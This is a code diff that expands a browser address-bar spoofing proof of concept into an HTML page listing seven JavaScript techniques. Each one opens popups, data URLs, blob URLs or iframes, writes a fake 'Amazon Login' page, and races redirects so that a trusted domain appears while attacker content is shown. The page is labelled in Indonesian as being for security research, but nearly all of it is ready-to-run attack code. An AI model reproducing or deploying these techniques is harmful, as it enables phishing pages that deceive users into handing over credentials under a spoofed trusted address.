@@ -1,52 +1,432 @@
-<script>
-function next() {
-    try {
-        w.location.replace('http://www.google.com/csi');
-    } catch(e) {
-        console.log('Navigation already completed');
-    }
-}
-
-function f() {
-    // Gunakan about:blank sebagai alternatif yang lebih reliable
-    var w = window.open('about:blank', 'new', 'width=500,height=500');
-    
-    if (!w) {
-        alert('Popup blocked! Please allow popups for this site.');
-        return;
-    }
-    
-    // Write content ke popup
-    setTimeout(function() {
-        try {
-            w.document.open();
-            w.document.write('<!DOCTYPE html><html><head><title>Loading...</title></head>');
-            w.document.write('<body><h1>Please wait...</h1>');
-            w.document.write('<script>');
-            w.document.write('setTimeout(function() { window.location = "http://amazon.com"; }, 300);');
-            w.document.write('<\/script></body></html>');
-            w.document.close();
-        } catch(e) {
-            console.error('Error writing to popup:', e);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Bar Spoofing - Alternative Techniques</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background: #f5f5f5;
         }
-    }, 100);
-    
-    // Monitor navigation dengan interval yang lebih reasonable
-    var i = setInterval(function() {
-        try {
-            var href = w.location.href;
-            // Jika masih bisa dibaca dan bukan blank, navigasi mungkin sedang terjadi
-            if (href && href !== 'about:blank' && !href.startsWith('about:')) {
-                clearInterval(i);
-                setTimeout(next, 50);
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        h3 {
+            color: #555;
+            margin-top: 30px;
+        }
+        button {
+            padding: 12px 24px;
+            margin: 8px;
+            border: none;
+            border-radius: 6px;
+            background: #007bff;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .info {
+            background: #e7f3ff;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 10px 0;
+            font-size: 13px;
+            border-left: 4px solid #007bff;
+        }
+        .method {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Address Bar Spoofing - Alternative Techniques</h1>
+        <div class="info">
+            <strong>Catatan:</strong> Teknik-teknik ini untuk tujuan penelitian keamanan. 
+            Hasil dapat bervariasi tergantung browser dan versinya.
+        </div>
+
+        <!-- Teknik 1 -->
+        <div class="method">
+            <h3>Teknik 1: about:blank + document.write</h3>
+            <button onclick="spoofMethod1()">Test Method 1</button>
+        </div>
+
+        <!-- Teknik 2 -->
+        <div class="method">
+            <h3>Teknik 2: Data URL + Redirect</h3>
+            <button onclick="spoofMethod2()">Test Method 2</button>
+        </div>
+
+        <!-- Teknik 3 -->
+        <div class="method">
+            <h3>Teknik 3: iframe dengan about:blank</h3>
+            <button onclick="spoofMethod3()">Test Method 3</button>
+        </div>
+
+        <!-- Teknik 4 -->
+        <div class="method">
+            <h3>Teknik 4: Multiple Redirect Race Condition</h3>
+            <button onclick="spoofMethod4()">Test Method 4</button>
+        </div>
+
+        <!-- Teknik 5 -->
+        <div class="method">
+            <h3>Teknik 5: Blob URL (Modern)</h3>
+            <button onclick="spoofMethod5()">Test Method 5</button>
+        </div>
+
+        <!-- Teknik 6 -->
+        <div class="method">
+            <h3>Teknik 6: Original (Improved Version)</h3>
+            <button onclick="spoofMethod6()">Test Method 6</button>
+        </div>
+
+        <!-- Teknik 7 -->
+        <div class="method">
+            <h3>Teknik 7: Combination Technique</h3>
+            <button onclick="spoofMethod7()">Test Method 7</button>
+        </div>
+    </div>
+
+    <script>
+        // Variabel global untuk menyimpan window reference
+        var globalWindow = null;
+        var globalInterval = null;
+
+        // Teknik 1: about:blank + document.write
+        function spoofMethod1() {
+            var w = window.open('about:blank', 'popup1', 'width=500,height=500');
+            
+            if (!w) {
+                alert('Popup diblokir! Izinkan popup untuk situs ini.');
+                return;
             }
-        } catch(e) {
-            // Cross-origin error berarti navigasi berhasil
-            clearInterval(i);
-            setTimeout(next, 100);
+            
+            setTimeout(function() {
+                try {
+                    w.document.open();
+                    w.document.write('<!DOCTYPE html><html><head><title>Amazon Login</title></head>');
+                    w.document.write('<body><h1>Please login</h1>');
+                    w.document.write('<p>Redirecting...</p>');
+                    w.document.write('<script>');
+                    w.document.write('setTimeout(function() { window.location = "http://amazon.com"; }, 500);');
+                    w.document.write('<\/script></body></html>');
+                    w.document.close();
+                } catch(e) {
+                    console.error('Error:', e);
+                }
+            }, 100);
+            
+            setTimeout(function() {
+                try {
+                    w.location.replace('http://www.google.com/csi');
+                } catch(e) {
+                    console.log('Navigation sudah selesai');
+                }
+            }, 1500);
         }
-    }, 50); // Interval lebih reasonable (50ms bukan 1ms)
-}
-</script>
 
-<a href="#" onclick="f(); return false;">Login with amazon</a>
+        // Teknik 2: Data URL + Redirect
+        function spoofMethod2() {
+            var targetURL = 'http://amazon.com';
+            var dataURL = 'data:text/html,<html><head><title>Loading...</title></head><body>';
+            dataURL += '<h1>Please wait...</h1>';
+            dataURL += '<script>';
+            dataURL += 'setTimeout(function(){window.location="' + targetURL + '";},100);';
+            dataURL += '<\/script>';
+            dataURL += '</body></html>';
+            
+            var w = window.open(dataURL, 'window', 'width=500,height=500');
+            
+            if (!w) {
+                alert('Popup diblokir!');
+                return;
+            }
+            
+            var i = setInterval(function() {
+                try {
+                    var href = w.location.href;
+                    if (href && href !== 'about:blank' && !href.startsWith('data:')) {
+                        clearInterval(i);
+                        setTimeout(function() {
+                            try {
+                                w.location.replace('http://www.google.com/csi');
+                            } catch(e) {
+                                console.log('Cannot redirect');
+                            }
+                        }, 50);
+                    }
+                } catch(e) {
+                    clearInterval(i);
+                    setTimeout(function() {
+                        try {
+                            w.location.replace('http://www.google.com/csi');
+                        } catch(e) {
+                            console.log('Cross-origin - navigation completed');
+                        }
+                    }, 100);
+                }
+            }, 10);
+        }
+
+        // Teknik 3: iframe dengan about:blank
+        function spoofMethod3() {
+            // Hapus iframe sebelumnya jika ada
+            var oldIframe = document.getElementById('spoof-iframe');
+            if (oldIframe) {
+                oldIframe.remove();
+            }
+            
+            var iframe = document.createElement('iframe');
+            iframe.id = 'spoof-iframe';
+            iframe.style.width = '100%';
+            iframe.style.height = '500px';
+            iframe.style.border = '2px solid #007bff';
+            iframe.style.borderRadius = '6px';
+            iframe.src = 'about:blank';
+            
+            document.querySelector('.container').appendChild(iframe);
+            
+            iframe.onload = function() {
+                try {
+                    var doc = iframe.contentWindow.document;
+                    doc.open();
+                    doc.write('<!DOCTYPE html><html><head><title>Amazon</title></head>');
+                    doc.write('<body style="padding:20px; font-family:Arial;">');
+                    doc.write('<h1>Please Login</h1>');
+                    doc.write('<p>This page will redirect...</p>');
+                    doc.write('<script>');
+                    doc.write('setTimeout(function() { window.location = "http://amazon.com"; }, 300);');
+                    doc.write('<\/script>');
+                    doc.write('</body></html>');
+                    doc.close();
+                } catch(e) {
+                    console.error('Error:', e);
+                }
+            };
+        }
+
+        // Teknik 4: Multiple Redirect Race Condition
+        function spoofMethod4() {
+            var w = window.open('about:blank', 'popup4', 'width=500,height=500');
+            
+            if (!w) {
+                alert('Popup diblokir!');
+                return;
+            }
+            
+            var redirects = [
+                function() { 
+                    try { 
+                        w.location.href = 'about:blank'; 
+                    } catch(e) {
+                        console.log('Redirect 1 failed');
+                    }
+                },
+                function() { 
+                    try { 
+                        w.location.href = 'data:text/html,<html><body>Loading...</body></html>'; 
+                    } catch(e) {
+                        console.log('Redirect 2 failed');
+                    }
+                },
+                function() { 
+                    try { 
+                        w.location.href = 'http://amazon.com'; 
+                    } catch(e) {
+                        console.log('Redirect 3 failed');
+                    }
+                },
+                function() { 
+                    try { 
+                        w.location.replace('http://www.google.com/csi'); 
+                    } catch(e) {
+                        console.log('Redirect 4 failed');
+                    }
+                }
+            ];
+            
+            redirects.forEach(function(redirect, index) {
+                setTimeout(redirect, index * 50);
+            });
+            
+            setTimeout(function() {
+                try {
+                    var href = w.location.href;
+                    console.log('Final URL:', href);
+                } catch(e) {
+                    console.log('Cross-origin - navigation completed');
+                }
+            }, 500);
+        }
+
+        // Teknik 5: Blob URL (Modern)
+        function spoofMethod5() {
+            var htmlContent = '<!DOCTYPE html><html><head><title>Amazon Login</title></head>';
+            htmlContent += '<body style="padding:20px; font-family:Arial;">';
+            htmlContent += '<h1>Please wait...</h1>';
+            htmlContent += '<p>Redirecting to Amazon...</p>';
+            htmlContent += '<script>';
+            htmlContent += 'setTimeout(function() { window.location = "http://amazon.com"; }, 200);';
+            htmlContent += '<\/script>';
+            htmlContent += '</body></html>';
+            
+            try {
+                var blob = new Blob([htmlContent], {type: 'text/html'});
+                var blobURL = URL.createObjectURL(blob);
+                
+                var w = window.open(blobURL, 'popup5', 'width=500,height=500');
+                
+                if (!w) {
+                    alert('Popup diblokir!');
+                    URL.revokeObjectURL(blobURL);
+                    return;
+                }
+                
+                var i = setInterval(function() {
+                    try {
+                        var href = w.location.href;
+                        if (href && !href.startsWith('blob:')) {
+                            clearInterval(i);
+                            setTimeout(function() {
+                                try {
+                                    w.location.replace('http://www.google.com/csi');
+                                } catch(e) {
+                                    console.log('Cannot redirect');
+                                }
+                            }, 50);
+                            URL.revokeObjectURL(blobURL);
+                        }
+                    } catch(e) {
+                        clearInterval(i);
+                        setTimeout(function() {
+                            try {
+                                w.location.replace('http://www.google.com/csi');
+                            } catch(e) {
+                                console.log('Cross-origin - navigation completed');
+                            }
+                        }, 100);
+                        URL.revokeObjectURL(blobURL);
+                    }
+                }, 10);
+            } catch(e) {
+                console.error('Blob URL tidak didukung:', e);
+                alert('Browser tidak mendukung Blob URL');
+            }
+        }
+
+        // Teknik 6: Original (Improved Version)
+        function spoofMethod6() {
+            function next() {
+                try {
+                    globalWindow.location.replace('http://www.google.com/csi');
+                } catch(e) {
+                    console.log('Navigation sudah selesai');
+                }
+            }
+
+            globalWindow = window.open('about:blank', 'new', 'width=500,height=500');
+            
+            if (!globalWindow) {
+                alert('Popup diblokir! Izinkan popup untuk situs ini.');
+                return;
+            }
+            
+            setTimeout(function() {
+                try {
+                    globalWindow.document.open();
+                    globalWindow.document.write('<!DOCTYPE html><html><head><title>Loading...</title></head>');
+                    globalWindow.document.write('<body><h1>Please wait...</h1>');
+                    globalWindow.document.write('<script>');
+                    globalWindow.document.write('setTimeout(function() { window.location = "http://amazon.com"; }, 300);');
+                    globalWindow.document.write('<\/script></body></html>');
+                    globalWindow.document.close();
+                } catch(e) {
+                    console.error('Error writing to popup:', e);
+                }
+            }, 100);
+            
+            globalInterval = setInterval(function() {
+                try {
+                    var href = globalWindow.location.href;
+                    if (href && href !== 'about:blank' && !href.startsWith('about:')) {
+                        clearInterval(globalInterval);
+                        setTimeout(next, 50);
+                    }
+                } catch(e) {
+                    clearInterval(globalInterval);
+                    setTimeout(next, 100);
+                }
+            }, 50);
+        }
+
+        // Teknik 7: Combination Technique
+        function spoofMethod7() {
+            var w = window.open('about:blank', 'popup7', 'width=500,height=500');
+            
+            if (!w) {
+                alert('Popup diblokir!');
+                return;
+            }
+            
+            // Step 1: Write initial content
+            setTimeout(function() {
+                try {
+                    w.document.open();
+                    w.document.write('<!DOCTYPE html><html><head><title>Amazon</title></head>');
+                    w.document.write('<body style="padding:20px;">');
+                    w.document.write('<h1>Redirecting...</h1>');
+                    w.document.write('</body></html>');
+                    w.document.close();
+                } catch(e) {
+                    console.error('Error step 1:', e);
+                }
+            }, 50);
+            
+            // Step 2: Navigate using location
+            setTimeout(function() {
+                try {
+                    w.location.href = 'data:text/html,<html><body><h1>Loading...</h1></body></html>';
+                } catch(e) {
+                    console.log('Step 2 failed');
+                }
+            }, 200);
+            
+            // Step 3: Final redirect to target
+            setTimeout(function() {
+                try {
+                    w.location.replace('http://amazon.com');
+                } catch(e) {
+                    console.log('Step 3 failed');
+                }
+            }, 400);
+            
+            // Step 4: Spoof redirect
+            setTimeout(function() {
+                try {
+                    w.location.replace('http://www.google.com/csi');
+                } catch(e) {
+                    console.log('Final redirect failed - navigation completed');
+                }
+            }, 800);
+        }
+    </script>
+</body>
+</html>
